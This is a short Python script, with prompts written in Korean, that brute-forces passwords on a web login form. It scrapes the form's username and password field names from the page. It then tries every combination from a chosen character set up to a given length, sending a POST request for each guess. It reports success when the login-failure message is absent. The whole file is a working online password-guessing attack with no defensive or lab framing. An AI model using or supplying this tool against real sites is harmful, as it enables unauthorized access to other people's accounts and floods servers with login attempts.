from itertools import product
import requests

words_t = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*'
words_m = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*'
words_s = 'abcdefghijklmnopqrstuvwxyz0123456789'
words = '0123456789'

def find_form(form_val):
    if form_val[0].find("name") == 1: form_val = form_val[1]
    else :
        cnt = 0
        while(True):
            if form_val[cnt].find("name") == 1 : 
                form_val = form_val[cnt+1]
                break
            else : cnt += 1
    return form_val


def brutefoce_attack():
    login_url = input("로그인 URL 입력 : ")
    id = input("\nID 입력 : ")
    print("\npw를 몇 자리 검색하시겠습니까? 숫자만 입력하십시오.\n")
    pw_len = int(input("입력 : "))
    print("\n로그인 실패 시 표시되는 문구를 입력해주십시오. (예) Login Fail, Password Incorrect, 로그인 실패")
    login_fail_text = input("\n입력 : ")
    print("\n비밀번호의 구성에 따라 옵션을 숫자로 선택해 주십시오.")
    print("\n1 - 숫자만 2 - 소문자+숫자 3 - 소문자+숫자+특수문자 4 - 대소문자+숫자+특수문자\n")
    select = int(input("입력 : "))
    if select == 1: pw_word = words
    elif select == 2: pw_word = words_s
    elif select == 3: pw_word = words_m
    elif select == 4: pw_word = words_t

    temp_address = requests.post(login_url)
    name_id = temp_address.text.split('<input type="text"')
    name_id = name_id[1].split("\"")
    name_id = find_form(name_id)
    name_pw = temp_address.text.split('<input type="password"')
    name_pw = name_pw[1].split('\"')
    name_pw = find_form(name_pw)
    for password_length in range(pw_len+1):
        for password in product(pw_word, repeat=password_length):
            password =''.join(password)
            print(f'{password}', end='\r')
            login_packet = {
                name_id : id,
                name_pw : password,
            }
            address = requests.post(login_url, data=login_packet)
            if address.text.find(login_fail_text) == -1:
                print("\n검색된 비밀번호 : " + password)
                break